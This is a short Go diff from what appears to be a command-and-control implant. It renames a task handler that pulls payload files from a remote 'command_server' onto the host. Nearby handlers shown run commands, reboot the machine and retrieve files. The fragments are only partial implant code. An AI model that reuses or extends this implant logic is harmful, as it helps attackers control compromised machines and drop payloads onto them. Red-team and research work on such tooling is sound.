@@ -198,8 +198,8 @@ func checkIn() {
 		reboot(post.TaskID)
 	case "run command":
 		go handle_runCommand(post.TaskID, post.Arg)
-	case "download":
-		go handle_download(post.TaskID, post.Arg)
+	case "send-file":
+		go handle_send_file(post.TaskID, post.Arg)
 	case "get-file":
 		go get_file(post.TaskID, post.Arg)
 	default:
@@ -292,7 +292,7 @@ func reboot(task_id string) error {
 
 }
 
-func handle_download(this_taskID string, args string) {
+func handle_send_file(this_taskID string, args string) {
 
 	parts := strings.Split(args, " || ")
 	if len(parts) != 2 {
@@ -313,12 +313,12 @@ func handle_download(this_taskID string, args string) {
 	send_response(response)
 
 	// Download the file
-	err := downloadFile(filename, destination, this_taskID)
+	err := send_file(filename, destination, this_taskID)
 	if err != nil {
 
-		response := Task_Response{this_taskID, "Failed", "Could not download file. Make sure it's in the payloads folder"}
+		response := Task_Response{this_taskID, "Failed", "Could not retrieve the file from the server."}
 		send_response(response)
-		fmt.Println("Error downloading file:", err)
+		fmt.Println("Error retrieving file from server:", err)
 		return
 	}
 
@@ -413,7 +413,7 @@ func get_file(this_taskID string, filepath string) error {
 	return nil
 }
 
-func downloadFile(filename string, filepath string, this_taskID string) error {
+func send_file(filename string, filepath string, this_taskID string) error {
 
 	// Create the file
 	out, err := os.Create(filepath)
@@ -427,7 +427,7 @@ func downloadFile(filename string, filepath string, this_taskID string) error {
 	defer out.Close()
 
 	// Make the request
-	resp, err := http.Get(command_server + "/download/" + filename)
+	resp, err := http.Get(command_server + "/send_file/" + filename)
 	if err != nil {
 		return err
 	}
@@ -436,7 +436,7 @@ func downloadFile(filename string, filepath string, this_taskID string) error {
 	// Check the status code
 	if resp.StatusCode != http.StatusOK {
 		os.Remove(filepath) // if the file isn't found. remove the empty destination
-		return fmt.Errorf("failed to download file: %s", resp.Status)
+		return fmt.Errorf("failed to send the file to node: %s", resp.Status)
 	}
 
 	// Write the body to file in chunks
